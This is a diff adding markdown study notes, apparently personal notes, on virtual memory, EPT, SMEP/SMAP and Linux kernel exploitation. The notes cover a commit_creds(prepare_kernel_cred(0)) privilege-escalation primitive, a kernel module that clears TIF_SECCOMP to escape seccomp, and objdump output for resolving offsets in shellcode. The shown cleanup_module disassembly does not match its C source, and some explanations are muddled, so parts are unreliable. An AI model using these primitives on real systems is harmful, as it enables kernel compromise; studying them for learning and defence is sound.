@@ -462,5 +462,279 @@ The EPT consists of multiple levels of data structures, similar to a four-level 
 
 In this way, the EPT acts as an additional layer of address translation, allowing the VMs to access "physical" memory as if they had full access to the host machine's physical memory. However, in reality, each "physical" memory access is translated through the EPT, which ensures that the VMs are isolated from each other and that they do not interfere with the operation of the other VMs.
 
+![[Pasted image 20230104202801.png]]
 
+Read : [https://rayanfam.com/topics/hypervisor-from-scratch-part-4](https://rayanfam.com/topics/hypervisor-from-scratch-part-4/)
+
+### Hardware Support for Virtual Memory
+
+In a virtual memory system, it would be very slow for the operating system kernel to perform all of the necessary address translations in software. This is because each memory access would require multiple lookups in the page tables and other data structures, which would take a significant amount of time.
+
+To overcome this problem, modern processors include a hardware component called the memory management unit (MMU). The MMU is responsible for performing the address translations in hardware, rather than in software. This allows the MMU to perform the translations much more quickly than the operating system kernel could.
+
+To further improve the performance of the address translation process, the MMU can use a cache called the translation lookaside buffer (TLB) to store the resolved addresses of recently accessed memory locations. When a memory access is made, the MMU can check the TLB to see if the resolved address is already stored there. If it is, the MMU can use the cached address to access the memory, rather than having to perform the full address translation process again.
+
+In this way, the MMU and the TLB work together to improve the performance of the virtual memory system by reducing the number of times that the operating system kernel needs to perform address translations in software. This allows the system to access memory more quickly and efficiently.
+
+So far, we focused on x86. But other architectures are analogous!
+ARM. (Simplified view. Full details: [https://developer.arm.com/documentation/100940/0101](https://developer.arm.com/documentation/100940/0101/))  
+CR3 equivalent: TTBR0 (for userspace) and TTBR1 (for kernel addresses).  
+Translation tables are referred to as Level 0, Level 1, Level 2, Level 3.
+Linux: generic terminology.
+PML4 = PGD (Page Global Directory)PDPT = PUD (Page Upper Directory) PD  = PMD (Page Mid-Level Directory) PT  = PT  (Page Table)
+Linux requires a hardware MMU (although certain forks do not).
+
+### The Kernel Sees All
+
+Memory used by one process is normally isolated from the memory used by other processes. This is done to protect the processes from each other and to prevent one process from accessing or modifying the memory of another process.
+
+However, the operating system kernel is able to access the memory of all processes and has full access to the physical memory of the system. In the past, some versions of the Linux operating system allowed users with root privileges to access the physical memory of the system through the /dev/mem device file. However, this could be a security risk, as it allowed users to potentially access or modify the memory of other processes or the kernel itself.
+
+To address this issue, modern versions of the Linux kernel use a different approach to access physical memory. Rather than allowing users to access physical memory directly, the kernel maps the physical memory into its own virtual address space. This allows the kernel to access the physical memory in a convenient and efficient manner, without exposing it to other processes.
+
+To facilitate the conversion between physical and virtual addresses, the kernel provides two macros: `phys_to_virt()` and `virt_to_phys()`. The `phys_to_virt()` macro converts a physical address into a virtual address that can be used by the kernel. `The virt_to_phys()` macro performs the reverse conversion, converting a virtual address used by the kernel into a physical address.
+
+These macros are typically implemented as simple address arithmetic operations, such as additions and subtractions. As a result, they are easy to compile and reverse-engineer, but they also provide a convenient and efficient way for the kernel to access physical memory.
+
+### Kernel Mitigations
+
+The Linux Kernel had 149 vulnerabilities (as tracked by CVEs) in 2021 alone so what does it means it means kernel will get hacked no matter what. So, what now ? Obviously we came up mitigation for the kernel as we did in userspace.
+
+The kernel has many mitigations. Some are familiar:
+
+- Stack canaries protect the stack
+  
+- kASLR bases the kernel at a random location at boot.
+  
+- Heap/stack regions are not executable by default.
+
+Of course, we can bypass them 
+
+- Stack canaries: leak the canary!
+
+- kASLR: leak the kernel base address
+
+- Heap/stack regions NX: ROP!
+
+### SMEP and SMAP
+
+SMEP (Supervisor Mode Execution Prevention) and SMAP (Supervisor Mode Access Prevention) are security features that are designed to protect the system from exploits that try to execute or access user-space memory from kernel-space (also known as ring 0).
+
+SMEP prevents kernel-space code from executing user-space memory at all. This means that any attempt by the kernel to execute code in user-space memory will be blocked.
+
+SMAP prevents the kernel from even accessing user-space memory unless the AC (Access Control) flag in the RFLAGS register is set. The stac and clac instructions can be used to set and clear this flag, respectively.
+
+There are cases where the kernel needs to access user-space memory, such as when it needs to access the path argument to the open() system call. In these cases, the copy_from_user function can be used to set the AC flag and allow the kernel to access the user-space memory.
+
+Overall, the purpose of SMEP and SMAP is to provide an additional layer of protection against exploits that try to execute or access user-space memory from kernel-space. These features help to prevent the kernel from being compromised by malicious code and ensure the integrity of the system.
+
+### What should we do ?
+
+There are many different techniques that can be used to exploit vulnerabilities in the kernel, both by attackers and by defenders. These techniques are constantly evolving, as new vulnerabilities are discovered and new defensive measures are developed.
+
+One technique that is sometimes used in kernel exploitation is the `run_cmd` function, which allows a command to be executed in user-space as the root user. This function is similar to the system() function, which is a standard C library function that allows a command to be executed by the operating system. However, the run_cmd function appears to be running the command within the kernel, rather than in user-space.
+
+It is generally not a good idea to "yolo-run" commands or code, particularly in the kernel, as this can expose the system to security vulnerabilities and other risks. It is important to thoroughly understand the potential consequences and risks of running any code, especially in sensitive areas such as the kernel.
+
+### Kernel ShellCode
+
+So, if you know how to write shellcode that is splendid but userspace shellcode will not work in kernel space because userpace shellcode is full of series of the syscalls. But why is this problem ?
+It's problem because the syscall interface if for the userspace to talk with kernelspace.
+
+When a program makes a syscall, execution of the program is temporarily suspended and control is transferred to the kernel. The kernel then performs the requested function and returns control to the program when the function is complete.
+
+The syscall_entry function is a function in the kernel that is responsible for handling syscalls. When a syscall is made, execution of the program is transferred to the syscall_entry function in the kernel. This function is designed to be called from user-space (the space where programs run), not from kernel-space (the space where the kernel runs).
+
+If the syscall_entry function is called from kernel-space, it may lead to unexpected and potentially harmful behavior, as the function is not designed to be called in this way. This can cause chaos and disrupt the normal operation of the system.
+
+In summary, the syscall_entry function is a function in the kernel that is responsible for handling syscalls made by programs. It is designed to be called from user-space and should not be called from kernel-space, as this can lead to unexpected and potentially harmful behavior.
+
+## How to write the kernel ShellCode ?
+
+Wakeup kid we are inside the kernelspace so we have kernel API. We have to use this in our shellcode. Keep in mind Kernel APIs are functions. You must call (not syscall) them from within the kernel.
+
+The following actions can be taken within the kernel using kernel APIs and kernel objects to achieve certain goals:
+
+-   Privilege elevation: This can be achieved by calling the commit_creds function with the result of the prepare_kernel_cred function as an argument. For example: commit_creds(prepare_kernel_cred(0)). This action changes the credentials (such as the user and group IDs) of the current process, potentially allowing the process to gain additional privileges.
+   
+-   Seccomp escape: This can be achieved by modifying the TIF_SECCOMP flag in the current task's thread_info structure. For example: current_task_struct->thread_info.flags &= ~(1 << TIF_SECCOMP). Seccomp is a security feature that allows programs to specify a filter that defines what system calls they are allowed to make. Disabling seccomp allows a program to make any system call, potentially bypassing restrictions that have been put in place.
+
+-   Command execution: This can be achieved by calling the run_cmd function and providing it with the path to the command that should be executed. For example: run_cmd("/path/to/my/command").    
+
+To perform these actions, it is necessary to find the current_task_struct structure and the offsets of its methods and members, as well as to call various kernel API functions such as prepare_kernel_cred, commit_creds, and run_cmd.  We can get these addresses from the `/proc/kallsyms` file.
+
+-   To find the locations of specific functions in the kernel when ASLR is disabled, look in the /proc/kallsyms file on an identical system. This file can be accessed with root privileges.
+  
+-   To find the locations of specific functions in the kernel when ASLR is enabled, you will need to leak a kernel address and calculate the offset.
+  
+-   ASLR is usually enabled on real-world systems, so you will typically need to leak a kernel address and calculate the offset to find the locations of specific functions in memory.
+
+### Calling kernel APIs
+
+Once you've found the APIs, you'll need to call them. Again, syscall is not the solution here! call is.
+The normal call instruction takes a relative 32-bit offset to shift execution by.
+To jump to a specific absolute location, without worrying about where your shellcode is in relation to the rest of the kernel, use the absolute form of call
+
+```asm
+mov rax, 0xffff414142424242  
+call rax
+
+/*This will jump to 0xffff414142424242!*/
+```
+
+### Figuring out the Offsets
+
+The kernel is WAY too complex to figure out offsets manually.
+
+Best option:
+
+- Write a kernel module in C with the actions you want your shellcode to do.
+
+- Build it for the kernel you want to attack.
+
+- Reverse-engineer it to see how these actions work in assembly.
+
+- Re-implement that assembly in your shellcode!
+
+This insane process will preserve your sanity.
+
+### Offsets Resolution
+
+The above mentioned process seems very easy but there is catch when we compile the modules using kbuild compiler adds many relative instruction by that i means they will be resolve at load time with help of module symbol and relocation table let's understand this with help of example.
+
+Consider this module 
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include<linux/sched.h>
+
+MODULE_LICENSE("GPL");
+
+int init_module(void)
+
+{
+
+    printk(KERN_INFO "Hello i'll beat you seccomp\n");
+
+    current->thread_info.flags &= ~ (1 << TIF_SECCOMP);
+
+    return 0;
+
+}
+
+void cleanup_module(void)
+
+{
+    printk(KERN_INFO "Escaped lol!");
+
+}
+```
+
+This module can be used to escape the seccomp filter when we will compile this module and try to look at assembly we will get something like this.
+
+
+```
+Disassembly of section .text.unlikely:
+
+0000000000000000 <init_module>:
+   0:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+   7:   e8 00 00 00 00          call   c <init_module+0xc>
+   c:   65 48 8b 04 25 00 00    mov    rax,QWORD PTR gs:0x0
+  13:   00 00 
+  15:   48 81 20 ff fe ff ff    and    QWORD PTR [rax],0xfffffffffffffeff
+  1c:   31 c0                   xor    eax,eax
+  1e:   c3                      ret    
+
+000000000000001f <cleanup_module>:
+  1f:   55                      push   rbp
+  20:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+  27:   48 bd 70 77 6e 2e 63    movabs rbp,0x6c6c6f632e6e7770
+  2e:   6f 6c 6c 
+  31:   53                      push   rbx
+  32:   bb 00 01 00 00          mov    ebx,0x100
+  37:   e8 00 00 00 00          call   3c <cleanup_module+0x1d>
+  3c:   48 8b 35 00 00 00 00    mov    rsi,QWORD PTR [rip+0x0]        # 43 <cleanup_module+0x24>
+  43:   48 01 de                add    rsi,rbx
+  46:   48 39 2e                cmp    QWORD PTR [rsi],rbp
+  49:   75 0f                   jne    5a <cleanup_module+0x3b>
+  4b:   48 89 f2                mov    rdx,rsi
+  4e:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+  55:   e8 00 00 00 00          call   5a <cleanup_module+0x3b>
+  5a:   48 81 c3 00 10 00 00    add    rbx,0x1000
+  61:   48 81 fb 00 a1 3f 7c    cmp    rbx,0x7c3fa100
+  68:   75 d2                   jne    3c <cleanup_module+0x1d>
+  6a:   5b                      pop    rbx
+  6b:   5d                      pop    rbp
+  6c:   c3                      ret    
+```
+
+Now let's focus on this part only because we want to inject shellcode which can escape the seccomp.
+
+```asm
+   c:   65 48 8b 04 25 00 00    mov    rax,QWORD PTR gs:0x0
+  13:   00 00 
+  15:   48 81 20 ff fe ff ff    and    QWORD PTR [rax],0xfffffffffffffeff
+  1c:   31 c0                   xor    eax,eax
+  1e:   c3                      ret    
+```
+
+When you will try to run this shellcode your process will get SEGFAULT. it's because the instruction
+`mov    rax,QWORD PTR gs:0x0` is expected to be resolved at load time
+
+When the kernel loads a module containing the line of code `current->thread_info.flags = ~(1 << TIF_SECCOMP)`, it uses the symbol table and relocation information contained in the module's object file to map the symbolic names and offsets used in the code to their corresponding addresses in the kernel's address space.
+
+For example, the symbol `current` is used to access a global variable in the kernel's address space. The symbol table will contain an entry for `current` that specifies the offset of the variable within the module's address space. When the kernel loads the module, it will use this information to determine the actual address of the `current` variable in the kernel's address space and update the code accordingly.
+
+The `thread_info` and `flags` members of the `current` structure are accessed using offsets, which are also contained in the symbol table. When the kernel loads the module, it will use these offsets to determine the actual addresses of these members within the kernel's address space and update the code accordingly.
+
+Finally, the `TIF_SECCOMP` constant is used as an argument to the `<<` operator, which shifts the value `1` to the left by the number of bits specified by `TIF_SECCOMP`. The result is then negated using the `~` operator, and the resulting value is stored in the `flags` member of the `thread_info` structure.
+
+### Workaround
+
+So, how can i get the offset the idea is simple you have to debug the running module to find the offsets. But wait how can i know which instructions are going to be resolved at load time you can use the -r flag in objdump when you will use the objdump with -r flag on the compiled module given in example your out will get output like this
+
+```asm
+
+
+Disassembly of section .text.unlikely:
+
+0000000000000000 <init_module>:
+   0:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+                        3: R_X86_64_32S .rodata.str1.1
+   7:   e8 00 00 00 00          call   c <init_module+0xc>
+                        8: R_X86_64_PLT32       printk-0x4
+   c:   65 48 8b 04 25 00 00    mov    rax,QWORD PTR gs:0x0
+  13:   00 00 
+                        11: R_X86_64_32S        current_task
+  15:   48 81 20 ff fe ff ff    and    QWORD PTR [rax],0xfffffffffffffeff
+  1c:   31 c0                   xor    eax,eax
+  1e:   c3                      ret    
+
+000000000000001f <cleanup_module>:
+  1f:   55                      push   rbp
+  20:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+                        23: R_X86_64_32S        .rodata.str1.1+0x16
+  27:   48 bd 70 77 6e 2e 63    movabs rbp,0x6c6c6f632e6e7770
+  2e:   6f 6c 6c 
+  31:   53                      push   rbx
+  32:   bb 00 01 00 00          mov    ebx,0x100
+  37:   e8 00 00 00 00          call   3c <cleanup_module+0x1d>
+                        38: R_X86_64_PLT32      printk-0x4
+  3c:   48 8b 35 00 00 00 00    mov    rsi,QWORD PTR [rip+0x0]        # 43 <cleanup_module+0x24>
+                        3f: R_X86_64_PC32       page_offset_base-0x4
+  43:   48 01 de                add    rsi,rbx
+  46:   48 39 2e                cmp    QWORD PTR [rsi],rbp
+  49:   75 0f                   jne    5a <cleanup_module+0x3b>
+  4b:   48 89 f2                mov    rdx,rsi
+  4e:   48 c7 c7 00 00 00 00    mov    rdi,0x0
+                        51: R_X86_64_32S        .rodata.str1.1+0x2a
+  55:   e8 00 00 00 00          call   5a <cleanup_module+0x3b>
+                        56: R_X86_64_PLT32      printk-0x4
+  5a:   48 81 c3 00 10 00 00    add    rbx,0x1000
+  61:   48 81 fb 00 a1 3f 7c    cmp    rbx,0x7c3fa100
+  68:   75 d2                   jne    3c <cleanup_module+0x1d>
+  6a:   5b                      pop    rbx
+  6b:   5d                      pop    rbp
+  6c:   c3                      ret    
+```
 
